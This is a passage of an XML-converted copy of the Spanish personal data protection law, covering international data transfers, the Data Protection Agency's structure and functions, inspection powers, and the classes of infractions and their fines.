depositados o inscritos en el Registro General de Protecci&#x00F3;n de Datos y, cuando corresponda, en los creados
a estos efectos por las Comunidades Aut&#x00F3;nomas, de acuerdo con el art&#x02CA;&#x0131;culo 41. El Registro General
de Protecci&#x00F3;n de Datos podr&#x00E1; denegar la inscripci&#x00F3;n cuando considere que no se ajusta a las
disposiciones legales y reglamentarias sobre la materia, debiendo, en este caso, el Director de la
Agencia de Protecci&#x00F3;n de Datos requerir a los solicitantes para que efect&#x00FA;en las correcciones
oportunas.
</para><section role="center"><title/>
<!--l. 1488--><para> T&#x00CD;TULO V
</para><!--l. 1490--><para>Movimiento internacional de datos</para></section>
<!--l. 1493--><para>Art&#x02CA;&#x0131;culo 33. Norma general.
</para><!--l. 1495--><para>  1. No podr&#x00E1;n realizarse transferencias temporales ni de&#xFB01;nitivas de datos de car&#x00E1;cter personal que hayan
sido objeto de tratamiento o hayan sido recogidos para someterlos a dicho tratamiento con destino a
pa&#x02CA;&#x0131;ses que no proporcionen un nivel de protecci&#x00F3;n equiparable al que presta la presente Ley,
salvo que, adem&#x00E1;s de haberse observado lo dispuesto en &#x00E9;sta, se obtenga autorizaci&#x00F3;n previa del
Director de la Agencia de Protecci&#x00F3;n de Datos, que s&#x00F3;lo podr&#x00E1; otorgarla si se obtienen garant&#x02CA;&#x0131;as
adecuadas.
<!--br/-->
</para><!--l. 1503--><para>  2. El car&#x00E1;cter adecuado del nivel de protecci&#x00F3;n que ofrece el pa&#x02CA;&#x0131;s de destino se evaluar&#x00E1; por la
Agencia de Protecci&#x00F3;n de Datos atendiendo a todas las circunstancias que concurran en la
transferencia o categor&#x02CA;&#x0131;a de transferencia de datos. En particular, se tomar&#x00E1; en consideraci&#x00F3;n la
naturaleza de los datos de &#xFB01;nalidad y la duraci&#x00F3;n del tratamiento o de los tratamientos previstos,
el pa&#x02CA;&#x0131;s de origen y el pa&#x02CA;&#x0131;s de destino &#xFB01;nal, las normas de Derecho, generales o sectoriales,
vigentes en el pa&#x02CA;&#x0131;s tercero de que se trate, el contenido de los informes de la Comisi&#x00F3;n de la Uni&#x00F3;n
Europea, as&#x02CA;&#x0131; como las normas profesionales y las medidas de seguridad en vigor en dichos pa&#x02CA;&#x0131;ses.
<!--br/-->Art&#x02CA;&#x0131;culo 34. Excepciones.
</para><!--l. 1516--><para>  Lo dispuesto en el art&#x02CA;&#x0131;culo anterior no ser&#x00E1; de aplicaci&#x00F3;n:
     </para><itemizedlist>
     <listitem>
     <!--l. 1518--><para>Cuando la transferencia internacional de datos de car&#x00E1;cter personal resulte de la aplicaci&#x00F3;n de
     tratados o convenios en los que sea parte Espa~na.
     </para></listitem>
     <listitem>
     <!--l. 1521--><para>Cuando la transferencia se haga a efectos de prestar o solicitar auxilio judicial internacional.
     </para></listitem>
     <listitem>

     <!--l. 1523--><para>Cuando  la  transferencia  sea  necesaria  para  la  prevenci&#x00F3;n  o  para  el  diagn&#x00F3;stico  m&#x00E9;dicos,  la
     prestaci&#x00F3;n de asistencia sanitaria o tratamiento m&#x00E9;dicos o la gesti&#x00F3;n de servicios sanitarios.
     </para></listitem>
     <listitem>
     <!--l. 1526--><para>Cuando se re&#xFB01;era a transferencias dinerarias conforme a su legislaci&#x00F3;n espec&#x02CA;&#x0131;&#xFB01;ca.
     </para></listitem>
     <listitem>
     <!--l. 1528--><para>Cuando el afectado haya dado su consentimiento inequ&#x02CA;&#x0131;voco a la transferencia prevista.
     </para></listitem>
     <listitem>
     <!--l. 1530--><para>Cuando la transferencia sea necesaria para la ejecuci&#x00F3;n de un contrato entre el afectado y el
     responsable del &#xFB01;chero o para la adopci&#x00F3;n de medidas precontractuales adoptadas a petici&#x00F3;n del
     afectado.
     </para></listitem>
     <listitem>
     <!--l. 1533--><para>Cuando la transferencia sea necesaria para la celebraci&#x00F3;n o ejecuci&#x00F3;n de un contrato celebrado
     o por celebrar, en inter&#x00E9;s del afectado, por el responsable del &#xFB01;chero y un tercero.
     </para></listitem>
     <listitem>
     <!--l. 1536--><para>Cuando la transferencia sea necesaria o legalmente exigida para la salvaguarda de un inter&#x00E9;s
     p&#x00FA;blico.  Tendr&#x00E1;  esta  consideraci&#x00F3;n  la  transferencia  solicitada  por  una  Administraci&#x00F3;n  &#xFB01;scal  o
     aduanera para el cumplimiento de sus competencias.
     </para></listitem>
     <listitem>
     <!--l. 1540--><para>Cuando la transferencia sea precisa para el reconocimiento, ejercicio o defensa de un derecho
     en un proceso judicial.
     </para></listitem>
     <listitem>
     <!--l. 1542--><para>Cuando la transferencia se efect&#x00FA;e, a petici&#x00F3;n de persona con inter&#x00E9;s leg&#x02CA;&#x0131;timo, desde un Registro
     P&#x00FA;blico y aqu&#x00E9;lla sea acorde con la &#xFB01;nalidad del mismo.
     </para></listitem>
     <listitem>
     <!--l. 1545--><para>Cuando la transferencia tenga como destino un Estado miembro de la Uni&#x00F3;n Europea, o un
     Estado respecto del cual la Comisi&#x00F3;n de las Comunidades Europeas, en el ejercicio de sus
     competencias, haya declarado que garantiza un nivel de protecci&#x00F3;n adecuado.</para></listitem></itemizedlist>
<!--l. 1550--><para>
</para><section role="center"><title/>
<!--l. 1550--><para> T&#x00CD;TULO VI
</para><!--l. 1552--><para>Agencia de Protecci&#x00F3;n de Datos</para></section>
<!--l. 1555--><para>Art&#x02CA;&#x0131;culo 35. Naturaleza y r&#x00E9;gimen jur&#x02CA;&#x0131;dico.
</para><!--l. 1557--><para>  1. La Agencia de Protecci&#x00F3;n de Datos es un Ente de Derecho p&#x00FA;blico, con personalidad jur&#x02CA;&#x0131;dica propia y
plena capacidad p&#x00FA;blica y privada, que act&#x00FA;a con plena independencia de las Administraciones P&#x00FA;blicas en el
ejercicio de sus funciones. Se regir&#x00E1; por lo dispuesto en la presente Ley y en un Estatuto propio, que ser&#x00E1;
aprobado por el Gobierno.
<!--br/-->

</para><!--l. 1563--><para>  2. En el ejercicio de sus funciones p&#x00FA;blicas, y en defecto de lo que disponga la presente Ley y sus
disposiciones de desarrollo, la Agencia de Protecci&#x00F3;n de Datos actuar&#x00E1; de conformidad con la Ley 30/1992,
de 26 de noviembre, de R&#x00E9;gimen Jur&#x02CA;&#x0131;dico de las Administraciones P&#x00FA;blicas y del Procedimiento
Administrativo Com&#x00FA;n. En sus adquisiciones patrimoniales y contrataci&#x00F3;n estar&#x00E1; sujeta al Derecho
privado.
<!--br/-->
</para><!--l. 1570--><para>  3. Los puestos de trabajo de los &#x00F3;rganos y servicios que integren la Agencia de Protecci&#x00F3;n de Datos ser&#x00E1;n
desempe~nados por funcionarios de las Administraciones P&#x00FA;blicas y por personal contratado al
efecto, seg&#x00FA;n la naturaleza de las funciones asignadas a cada puesto de trabajo. Este personal est&#x00E1;
obligado a guardar secreto de los datos de car&#x00E1;cter personal de que conozca en el desarrollo de su
funci&#x00F3;n.
<!--br/-->
</para><!--l. 1577--><para>  4. La Agencia de Protecci&#x00F3;n de Datos contar&#x00E1;, para el cumplimiento de sus &#xFB01;nes, con los siguientes bienes
y medios econ&#x00F3;micos:
     </para><itemizedlist>
     <listitem>
     <!--l. 1580--><para>Las asignaciones que se establezcan anualmente con cargo a los Presupuestos Generales del
     Estado.
     </para></listitem>
     <listitem>
     <!--l. 1582--><para>Los bienes y valores que constituyan su patrimonio, as&#x02CA;&#x0131;como los productos y rentas del mismo.
     </para></listitem>
     <listitem>
     <!--l. 1584--><para>Cualesquiera otros que legalmente puedan serle atribuidos.</para></listitem></itemizedlist>
<!--l. 1587--><para>  5. La Agencia de Protecci&#x00F3;n de Datos elaborar&#x00E1; y aprobar&#x00E1; con car&#x00E1;cter anual el correspondiente
anteproyecto de presupuesto y lo remitir&#x00E1; al Gobierno para que sea integrado, con la debida independencia,
en los Presupuestos Generales del Estado.
<!--br/-->Art&#x02CA;&#x0131;culo 36. El Director.
</para><!--l. 1594--><para>  1. El Director de la Agencia de Protecci&#x00F3;n de Datos dirige la Agencia y ostenta su representaci&#x00F3;n. Ser&#x00E1;
nombrado, de entre quienes componen el Consejo Consultivo, mediante Real Decreto, por un per&#x02CA;&#x0131;odo de
cuatro a~nos.
<!--br/-->
</para><!--l. 1599--><para>  2. Ejercer&#x00E1; sus funciones con plena independencia y objetividad, y no estar&#x00E1; sujeto a instrucci&#x00F3;n alguna en
el desempe~no de aqu&#x00E9;llas.
<!--br/-->En todo caso, el Director deber&#x00E1; o&#x02CA;&#x0131;r al Consejo Consultivo en aquellas propuestas que &#x00E9;ste le realice en el
ejercicio de sus funciones.
<!--br/-->
</para><!--l. 1604--><para>  3. El Director de la Agencia de Protecci&#x00F3;n de Datos s&#x00F3;lo cesar&#x00E1; antes de la expiraci&#x00F3;n del per&#x02CA;&#x0131;odo a que se
re&#xFB01;ere el apartado 1 a petici&#x00F3;n propia o por separaci&#x00F3;n acordada por el Gobierno, previa instrucci&#x00F3;n de
expediente, en el que necesariamente ser&#x00E1;n o&#x02CA;&#x0131;dos los restantes miembros del Consejo Consultivo, por
incumplimiento grave de sus obligaciones, incapacidad sobrevenida para el ejercicio de su funci&#x00F3;n,
incompatibilidad o condena por delito doloso.
<!--br/-->
</para><!--l. 1612--><para>  4. El Director de la Agencia de Protecci&#x00F3;n de Datos tendr&#x00E1; la consideraci&#x00F3;n de alto cargo y quedar&#x00E1; en la
situaci&#x00F3;n de servicios especiales si con anterioridad estuviera desempe~nando una funci&#x00F3;n p&#x00FA;blica. En el
supuesto de que sea nombrado para el cargo alg&#x00FA;n miembro de la carrera judicial o &#xFB01;scal, pasar&#x00E1; asimismo a
la situaci&#x00F3;n administrativa de servicios especiales.
<!--br/-->Art&#x02CA;&#x0131;culo 36. Funciones.
</para><!--l. 1621--><para>  Son funciones de la Agencia de Protecci&#x00F3;n de Datos:
     </para><itemizedlist>
     <listitem>

     <!--l. 1623--><para>Velar por el cumplimiento de la legislaci&#x00F3;n sobre protecci&#x00F3;n de datos y controlar su aplicaci&#x00F3;n, en
     especial en lo relativo a los derechos de informaci&#x00F3;n, acceso, recti&#xFB01;caci&#x00F3;n, oposici&#x00F3;n y cancelaci&#x00F3;n
     de datos.
     </para></listitem>
     <listitem>
     <!--l. 1626--><para>Emitir las autorizaciones previstas en la Ley o en sus disposiciones reglamentarias.
     </para></listitem>
     <listitem>
     <!--l. 1628--><para>Dictar, en su caso y sin perjuicio de las competencias de otros &#x00F3;rganos, las instrucciones precisas
     para adecuar los tratamientos a los principios de la presente Ley.
     </para></listitem>
     <listitem>
     <!--l. 1631--><para>Atender las peticiones y reclamaciones formuladas por las personas afectadas.
     </para></listitem>
     <listitem>
     <!--l. 1633--><para>Proporcionar informaci&#x00F3;n a las personas acerca de sus derechos en materia de tratamiento de
     los datos de car&#x00E1;cter personal.
     </para></listitem>
     <listitem>
     <!--l. 1635--><para>Requerir a los responsables y los encargados de los tratamientos, previa audiencia de &#x00E9;stos,
     la  adopci&#x00F3;n  de  las  medidas  necesarias  para  la  adecuaci&#x00F3;n  del  tratamiento  de  datos  a  las
     disposiciones de esta Ley y, en su caso, ordenar la cesaci&#x00F3;n de los tratamientos y la cancelaci&#x00F3;n
     de los &#xFB01;cheros, cuando no se ajuste a sus disposiciones.
     </para></listitem>
     <listitem>
     <!--l. 1640--><para>Ejercer la potestad sancionadora en los t&#x00E9;rminos previstos por el T&#x02CA;&#x0131;tulo VII de la presente Ley.
     </para></listitem>
     <listitem>
     <!--l. 1642--><para>Informar, con car&#x00E1;cter preceptivo, los proyectos de disposiciones generales que desarrollen esta
     Ley.
     </para></listitem>
     <listitem>
     <!--l. 1644--><para>Recabar de los responsables de los &#xFB01;cheros cuanta ayuda e informaci&#x00F3;n estime necesaria para
     el desempe~no de sus funciones.
     </para></listitem>
     <listitem>
     <!--l. 1646--><para>Velar por la publicidad de la existencia de los &#xFB01;cheros de datos con car&#x00E1;cter personal, a cuyo
     efecto publicar&#x00E1; peri&#x00F3;dicamente una relaci&#x00F3;n de dichos &#xFB01;cheros con la informaci&#x00F3;n adicional que
     el Director de la Agencia determine.
     </para></listitem>
     <listitem>
     <!--l. 1650--><para>Redactar una memoria anual y remitirla al Ministerio de Justicia.
     </para></listitem>
     <listitem>
     <!--l. 1651--><para>Ejercer el control y adoptar las autorizaciones que procedan en relaci&#x00F3;n con los movimientos
     internacionales de datos, as&#x02CA;&#x0131; como desempe~nar las funciones de cooperaci&#x00F3;n internacional en
     materia de protecci&#x00F3;n de datos personales.

     </para></listitem>
     <listitem>
     <!--l. 1655--><para>Velar por el cumplimiento de las disposiciones que la Ley de la Funci&#x00F3;n Estad&#x02CA;&#x0131;stica P&#x00FA;blica
     establece  respecto  a  la  recogida  de  datos  estad&#x02CA;&#x0131;sticos  y  al  secreto  estad&#x02CA;&#x0131;stico,  as&#x02CA;&#x0131; como
     dictar las instrucciones precisas, dictaminar sobre las condiciones de seguridad de los &#xFB01;cheros
     constituidos con &#xFB01;nes exclusivamente estad&#x02CA;&#x0131;sticos y ejercer la potestad a la que se re&#xFB01;ere el
     art&#x02CA;&#x0131;culo 46.
     </para></listitem>
     <listitem>
     <!--l. 1661--><para>Cuantas otras le sean atribuidas por normas legales o reglamentarias.</para></listitem></itemizedlist>
<!--l. 1665--><para>Art&#x02CA;&#x0131;culo 38. Consejo Consultivo.
</para><!--l. 1667--><para>  El Director de la Agencia de Protecci&#x00F3;n de Datos estar&#x00E1; asesorado por un Consejo Consultivo compuesto
por los siguientes miembros:
     </para><itemizedlist>
     <listitem>
     <!--l. 1670--><para>Un Diputado, propuesto por el Congreso de los Diputados.
     </para></listitem>
     <listitem>
     <!--l. 1671--><para>Un Senador, propuesto por el Senado.
     </para></listitem>
     <listitem>
     <!--l. 1672--><para>Un representante de la Administraci&#x00F3;n Central, designado por el Gobierno.
     </para></listitem>
     <listitem>
     <!--l. 1674--><para>Un  representante  de  la  Administraci&#x00F3;n  Local,  propuesto  por  la  Federaci&#x00F3;n  Espa~nola  de
     Municipios y Provincias.
     </para></listitem>
     <listitem>
     <!--l. 1676--><para>Un miembro de la Real Academia de la Historia, propuesto por la misma.
     </para></listitem>
     <listitem>
     <!--l. 1677--><para>Un experto en la materia, propuesto por el Consejo Superior de Universidades.
     </para></listitem>
     <listitem>
     <!--l. 1679--><para>Un  representante  de  los  usuarios  y  consumidores,  seleccionado  del  modo  que  se  prevea
     reglamentariamente.
     </para></listitem>
     <listitem>
     <!--l. 1681--><para>Un representante de cada Comunidad Aut&#x00F3;noma que haya creado una agencia de protecci&#x00F3;n de
     datos en su &#x00E1;mbito territorial, propuesto de acuerdo con el procedimiento que establezca la
     respectiva Comunidad Aut&#x00F3;noma.
     </para></listitem>
     <listitem>
     <!--l. 1684--><para>Un  representante  del  sector  de  &#xFB01;cheros  privados,  para  cuya  propuesta  se  seguir&#x00E1;  el
     procedimiento que se regule reglamentariamente.</para></listitem></itemizedlist>

<!--l. 1687--><para>El funcionamiento del Consejo Consultivo se regir&#x00E1; por las normas reglamentarias que al efecto se
establezcan.
<!--br/-->Art&#x02CA;&#x0131;culo 39. El Registro General de Protecci&#x00F3;n de Datos.
</para><!--l. 1692--><para>  1. El Registro General de Protecci&#x00F3;n de Datos es un &#x00F3;rgano integrado en la Agencia de Protecci&#x00F3;n de
Datos.
<!--br/-->
</para><!--l. 1695--><para>  2. Ser&#x00E1;n objeto de inscripci&#x00F3;n en el Registro General de Protecci&#x00F3;n de Datos:
     </para><itemizedlist>
     <listitem>
     <!--l. 1698--><para>Los &#xFB01;cheros de que sean titulares las Administraciones P&#x00FA;blicas.
     </para></listitem>
     <listitem>
     <!--l. 1699--><para>Los &#xFB01;cheros de titularidad privada.
     </para></listitem>
     <listitem>
     <!--l. 1700--><para>Las autorizaciones a que se re&#xFB01;ere la presente Ley.
     </para></listitem>
     <listitem>
     <!--l. 1701--><para>Los c&#x00F3;digos tipo a que se re&#xFB01;ere el art&#x02CA;&#x0131;culo 32 de la presente Ley.
     </para></listitem>
     <listitem>
     <!--l. 1703--><para>Los datos relativos a los &#xFB01;cheros que sean necesarios para el ejercicio de los derechos de
     informaci&#x00F3;n, acceso, recti&#xFB01;caci&#x00F3;n, cancelaci&#x00F3;n y oposici&#x00F3;n.</para></listitem></itemizedlist>
<!--l. 1708--><para>  3. Por v&#x02CA;&#x0131;a reglamentaria se regular&#x00E1; el procedimiento de inscripci&#x00F3;n de los &#xFB01;cheros, tanto de titularidad
p&#x00FA;blica como de titularidad privada, en el Registro General de Protecci&#x00F3;n de Datos, el contenido de la
inscripci&#x00F3;n, su modi&#xFB01;caci&#x00F3;n, cancelaci&#x00F3;n, reclamaciones y recursos contra las resoluciones correspondientes y
dem&#x00E1;s extremos pertinentes.
<!--br/-->Art&#x02CA;&#x0131;culo 40. Potestad de inspecci&#x00F3;n.
</para><!--l. 1717--><para>  1. Las autoridades de control podr&#x00E1;n inspeccionar los &#xFB01;cheros a que hace referencia la presente Ley,
recabando cuantas informaciones precisen para el cumplimiento de sus cometidos.
<!--br/-->A tal efecto, podr&#x00E1;n solicitar la exhibici&#x00F3;n o el env&#x02CA;&#x0131;o de documentos y datos y examinarlos en el lugar en que
se encuentren depositados, as&#x02CA;&#x0131; como inspeccionar los equipos f&#x02CA;&#x0131;sicos y l&#x00F3;gicos utilizados para el tratamiento
de los datos, accediendo a los locales donde se hallen instalados.
<!--br/-->
</para><!--l. 1725--><para>  2. Los funcionarios que ejerzan la inspecci&#x00F3;n a que se re&#xFB01;ere el apartado anterior tendr&#x00E1;n la consideraci&#x00F3;n
de autoridad p&#x00FA;blica en el desempe~no de sus cometidos.
<!--br/-->Estar&#x00E1;n obligados a guardar secreto sobre las informaciones que conozcan en el ejercicio de las mencionadas
funciones, incluso despu&#x00E9;s de haber cesado en las mismas.
<!--br/-->Art&#x02CA;&#x0131;culo 41. &#x00D3;rganos correspondientes de las Comunidades Aut&#x00F3;nomas.
</para><!--l. 1735--><para>  1. Las funciones de la Agencia de Protecci&#x00F3;n de Datos reguladas en el art&#x02CA;&#x0131;culo 37, a excepci&#x00F3;n de las
mencionadas en los apartados (j), (k) y (l), y en los apartados (f) y (g) en lo que se re&#xFB01;ere a las
transferencias internacionales de datos, as&#x02CA;&#x0131; como en los art&#x02CA;&#x0131;culos 46 y 49, en relaci&#x00F3;n con sus
espec&#x02CA;&#x0131;&#xFB01;cas competencias ser&#x00E1;n ejercidas, cuando afecten a &#xFB01;cheros de datos de car&#x00E1;cter personal
creados o gestionados por las Comunidades Aut&#x00F3;nomas y por la Administraci&#x00F3;n local de su &#x00E1;mbito
territorial, por los &#x00F3;rganos correspondientes de cada Comunidad, que tendr&#x00E1;n la consideraci&#x00F3;n de
autoridades de control, a los que garantizar&#x00E1;n plena independencia y objetividad en el ejercicio de su
cometido.
<!--br/-->

</para><!--l. 1747--><para>  2. Las Comunidades Aut&#x00F3;nomas podr&#x00E1;n crear y mantener sus propios registros de &#xFB01;cheros para el ejercicio
de las competencias que se les reconoce sobre los mismos.
<!--br/-->
</para><!--l. 1751--><para>  3. El Director de la Agencia de Protecci&#x00F3;n de Datos podr&#x00E1; convocar regularmente a los &#x00F3;rganos
correspondientes de las Comunidades Aut&#x00F3;nomas a efectos de cooperaci&#x00F3;n institucional y coordinaci&#x00F3;n de
criterios o procedimientos de actuaci&#x00F3;n. El Director de la Agencia de Protecci&#x00F3;n de Datos y los &#x00F3;rganos
correspondientes de las Comunidades Aut&#x00F3;nomas podr&#x00E1;n solicitarse mutuamente la informaci&#x00F3;n necesaria
para el cumplimiento de sus funciones.
<!--br/-->Art&#x02CA;&#x0131;culo 42. Ficheros de las Comunidades Aut&#x00F3;nomas en materia de su exclusiva
competencia.
</para><!--l. 1762--><para>  1. Cuando el Director de la Agencia de Protecci&#x00F3;n de Datos constate que el mantenimiento o uso de un
determinado &#xFB01;chero de las Comunidades Aut&#x00F3;nomas contraviene alg&#x00FA;n precepto de esta Ley en
materia de su exclusiva competencia podr&#x00E1; requerir a la Administraci&#x00F3;n correspondiente que
se adopten las medidas correctoras que determine en el plazo que expresamente se &#xFB01;je en el
requerimiento.
<!--br/-->
</para><!--l. 1769--><para>  2. Si la Administraci&#x00F3;n P&#x00FA;blica correspondiente no cumpliera el requerimiento formulado, el
Director de la Agencia de Protecci&#x00F3;n de Datos podr&#x00E1; impugnar la resoluci&#x00F3;n adoptada por aquella
Administraci&#x00F3;n.
</para><section role="center"><title/>
<!--l. 1772--><para> T&#x00CD;TULO VII
</para><!--l. 1773--><para>Infracciones y sanciones</para></section>
<!--l. 1774--><para>Art&#x02CA;&#x0131;culo 43. Responsables.
</para><!--l. 1776--><para>  1. Los responsables de los &#xFB01;cheros y los encargados de los tratamientos estar&#x00E1;n sujetos al r&#x00E9;gimen
sancionador establecido en la presente Ley.
<!--br/-->
</para><!--l. 1780--><para>  2. Cuando se trate de &#xFB01;cheros de los que sean responsables las Administraciones P&#x00FA;blicas se estar&#x00E1;,
en cuanto al procedimiento y a las sanciones, a lo dispuesto en el art&#x02CA;&#x0131;culo 46, apartado 2.
<!--br/-->Art&#x02CA;&#x0131;culo 44. Tipos de infracciones.
</para><!--l. 1785--><para>  1. Las infracciones se cali&#xFB01;car&#x00E1;n como leves, graves o muy graves.
<!--br/-->
</para><!--l. 1788--><para>  2. Son infracciones leves:
     </para><itemizedlist>
     <listitem>
     <!--l. 1788--><para>No atender, por motivos formales, la solicitud del interesado de recti&#xFB01;caci&#x00F3;n o cancelaci&#x00F3;n de
     los datos personales objeto de tratamiento cuando legalmente proceda.
     </para></listitem>
     <listitem>
     <!--l. 1791--><para>No proporcionar la informaci&#x00F3;n que solicite la Agencia de Protecci&#x00F3;n de Datos en el ejercicio de
     las competencias que tiene legalmente atribuidas, en relaci&#x00F3;n con aspectos no sustantivos de la
     protecci&#x00F3;n de datos.
     </para></listitem>
     <listitem>
     <!--l. 1794--><para>No solicitar la inscripci&#x00F3;n del &#xFB01;chero de datos de car&#x00E1;cter personal en el Registro General de
     Protecci&#x00F3;n de Datos, cuando no sea constitutivo de infracci&#x00F3;n grave.
     </para></listitem>
     <listitem>
     <!--l. 1797--><para>Proceder a la recogida de datos de car&#x00E1;cter personal de los propios afectados sin proporcionarles
     la informaci&#x00F3;n que se~nala el art&#x02CA;&#x0131;culo 5 de la presente Ley.

     </para></listitem>
     <listitem>
     <!--l. 1800--><para>Incumplir el deber de secreto establecido en el art&#x02CA;&#x0131;culo 10 de esta Ley, salvo que constituya
     infracci&#x00F3;n grave.</para></listitem></itemizedlist>
<!--l. 1803--><para>  3. Son infracciones graves:
     </para><itemizedlist>
     <listitem>
     <!--l. 1803--><para>Proceder a la creaci&#x00F3;n de &#xFB01;cheros de titularidad p&#x00FA;blica o iniciar la recogida de datos de car&#x00E1;cter
     personal para los mismos, sin autorizaci&#x00F3;n de disposici&#x00F3;n general, publicada en el &#x2018;Bolet&#x02CA;&#x0131;n O&#xFB01;cial
     del Estado&#x2019; o diario o&#xFB01;cial correspondiente.
     </para></listitem>
     <listitem>
     <!--l. 1807--><para>Proceder a la creaci&#x00F3;n de &#xFB01;cheros de titularidad privada o iniciar la recogida de datos de car&#x00E1;cter
     personal para los mismos con &#xFB01;nalidades distintas de las que constituyen el objeto leg&#x02CA;&#x0131;timo
     de la empresa o entidad.
     </para></listitem>
     <listitem>
     <!--l. 1811--><para>Proceder a la recogida de datos de car&#x00E1;cter personal sin recabar el consentimiento expreso de
     las personas afectadas, en los casos en que &#x00E9;ste sea exigible.
     </para></listitem>
     <listitem>
     <!--l. 1813--><para>Tratar los datos de car&#x00E1;cter personal o usarlos posteriormente con conculcaci&#x00F3;n de los principios
     y garant&#x02CA;&#x0131;as establecidos en la presente Ley o con incumplimiento de los preceptos de protecci&#x00F3;n
     que impongan las disposiciones reglamentarias de desarrollo, cuando no constituya infracci&#x00F3;n
     muy grave.
     </para></listitem>
     <listitem>
     <!--l. 1817--><para>El impedimento o la obstaculizaci&#x00F3;n del ejercicio de los derechos de acceso y oposici&#x00F3;n y la
     negativa a facilitar la informaci&#x00F3;n que sea solicitada.
     </para></listitem>
     <listitem>
     <!--l. 1820--><para>Mantener datos de car&#x00E1;cter personal inexactos o no efectuar las recti&#xFB01;caciones o cancelaciones
     de los mismos que legalmente procedan cuando resulten afectados los derechos de las personas
     que la presente Ley ampara.
     </para></listitem>
     <listitem>
     <!--l. 1823--><para>La vulneraci&#x00F3;n del deber de guardar secreto sobre los datos de car&#x00E1;cter personal incorporados a
     &#xFB01;cheros que contengan datos relativos a la comisi&#x00F3;n de infracciones administrativas o penales,
     Hacienda P&#x00FA;blica, servicios &#xFB01;nancieros, prestaci&#x00F3;n de servicios de solvencia patrimonial y cr&#x00E9;dito,
     as&#x02CA;&#x0131; como aquellos otros &#xFB01;cheros que contengan un conjunto de datos de car&#x00E1;cter personal
     su&#xFB01;cientes para obtener una evaluaci&#x00F3;n de la personalidad del individuo.
     </para></listitem>
     <listitem>
     <!--l. 1830--><para>Mantener los &#xFB01;cheros, locales, programas o equipos que contengan datos de car&#x00E1;cter personal
     sin las debidas condiciones de seguridad que por v&#x02CA;&#x0131;a reglamentaria se determinen.

     </para></listitem>
     <listitem>
     <!--l. 1833--><para>No remitir a la Agencia de Protecci&#x00F3;n de Datos las noti&#xFB01;caciones previstas en esta Ley o en sus
     disposiciones de desarrollo, as&#x02CA;&#x0131;como no proporcionar en plazo a la misma cuantos documentos
     e informaciones deba recibir o sean requeridos por aqu&#x00E9;l a tales efectos.
     </para></listitem>
     <listitem>
     <!--l. 1837--><para>La obstrucci&#x00F3;n al ejercicio de la funci&#x00F3;n inspectora.
     </para></listitem>
     <listitem>
     <!--l. 1838--><para>No inscribir el &#xFB01;chero de datos de car&#x00E1;cter personal en el Registro General de Protecci&#x00F3;n de
     Datos, cuando haya sido requerido para ello por el Director de la Agencia de Protecci&#x00F3;n de
     Datos.
     </para></listitem>
     <listitem>
     <!--l. 1841--><para>Incumplir el deber de informaci&#x00F3;n que se establece en los art&#x02CA;&#x0131;culos 5, 28 y 29 de esta Ley,
     cuando los datos hayan sido recabados de persona distinta del afectado.</para></listitem></itemizedlist>
<!--l. 1845--><para>  4. Son infracciones muy graves:
     </para><itemizedlist>
     <listitem>
     <!--l. 1845--><para>La recogida de datos en forma enga~nosa y fraudulenta.
     </para></listitem>
     <listitem>
     <!--l. 1846--><para>La  comunicaci&#x00F3;n  o  cesi&#x00F3;n  de  los  datos  de  car&#x00E1;cter  personal,  fuera  de  los  casos  en  que  est&#x00E9;n
     permitidas.
     </para></listitem>
     <listitem>
     <!--l. 1848--><para>Recabar y tratar los datos de car&#x00E1;cter personal a los que se re&#xFB01;ere el apartado 2 del art&#x02CA;&#x0131;culo 7
     cuando no medie el consentimiento expreso del afectado; recabar y tratar los datos referidos
     en el apartado 3 del art&#x02CA;&#x0131;culo 7 cuando no lo disponga una Ley o el afectado no haya consentido
     expresamente, o violentar la prohibici&#x00F3;n contenida en el apartado 4 del art&#x02CA;&#x0131;culo 7.
     </para></listitem>
     <listitem>
     <!--l. 1854--><para>No cesar en el uso ileg&#x02CA;&#x0131;timo de los tratamientos de datos de car&#x00E1;cter personal cuando sea
     requerido para ello por el Director de la Agencia de Protecci&#x00F3;n de Datos o por las personas
     titulares del derecho de acceso.
     </para></listitem>
     <listitem>
     <!--l. 1857--><para>La transferencia temporal o de&#xFB01;nitiva de datos de car&#x00E1;cter personal que hayan sido objeto
     de tratamiento o hayan sido recogidos para someterlos a dicho tratamiento, con destino a
     pa&#x02CA;&#x0131;ses que no proporcionen un nivel de protecci&#x00F3;n equiparable sin autorizaci&#x00F3;n del Director de
     la Agencia de Protecci&#x00F3;n de Datos.
     </para></listitem>
     <listitem>
     <!--l. 1862--><para>Tratar los datos de car&#x00E1;cter personal de forma ileg&#x02CA;&#x0131;tima o con menosprecio de los principios y
     garant&#x02CA;&#x0131;as que les sean de aplicaci&#x00F3;n, cuando con ello se impida o se atente contra el ejercicio
     de los derechos fundamentales.

     </para></listitem>
     <listitem>
     <!--l. 1866--><para>La vulneraci&#x00F3;n del deber de guardar secreto sobre los datos de car&#x00E1;cter personal a que hacen
     referencia los apartados 2 y 3 del art&#x02CA;&#x0131;culo 7, as&#x02CA;&#x0131; como los que hayan sido recabados para &#xFB01;nes
     policiales sin consentimiento de las personas afectadas.
     </para></listitem>
     <listitem>
     <!--l. 1870--><para>No  atender,  u  obstaculizar  de  forma  sistem&#x00E1;tica  el  ejercicio  de  los  derechos  de  acceso,
     recti&#xFB01;caci&#x00F3;n, cancelaci&#x00F3;n u oposici&#x00F3;n.
     </para></listitem>
     <listitem>
     <!--l. 1872--><para>No atender de forma sistem&#x00E1;tica el deber legal de noti&#xFB01;caci&#x00F3;n de la inclusi&#x00F3;n de datos de car&#x00E1;cter
     personal en un &#xFB01;chero.</para></listitem></itemizedlist>
<!--l. 1874--><para>Art&#x02CA;&#x0131;culo 45. Tipo de sanciones.
</para><!--l. 1877--><para>  1. Las infracciones leves ser&#x00E1;n sancionadas con multa de 100.000 a 10.000.000 de pesetas.
<!--br/-->
</para><!--l. 1880--><para>  2. Las infracciones graves ser&#x00E1;n sancionadas con multa de 10.000.000 a 50.000.000 de pesetas.
<!--br/-->
</para><!--l. 1883--><para>  3. Las infracciones muy graves ser&#x00E1;n sancionadas con multa de 50.000.000 a 100.000.000 de
pesetas.
<!--br/-->
</para><!--l. 1886--><para>  4. La cuant&#x02CA;&#x0131;a de las sanciones se graduar&#x00E1; atendiendo a la naturaleza de los derechos personales
afectados, al volumen de los tratamientos efectuados, a los bene&#xFB01;cios obtenidos, al grado de
intencionalidad, a la reincidencia, a los da~nos y perjuicios causados a las personas interesadas y a terceras
personas, y a cualquier otra circunstancia que sea relevante para determinar el grado de antijuridicidad y
de culpabilidad presentes en la concreta actuaci&#x00F3;n infractora.
<!--br/-->
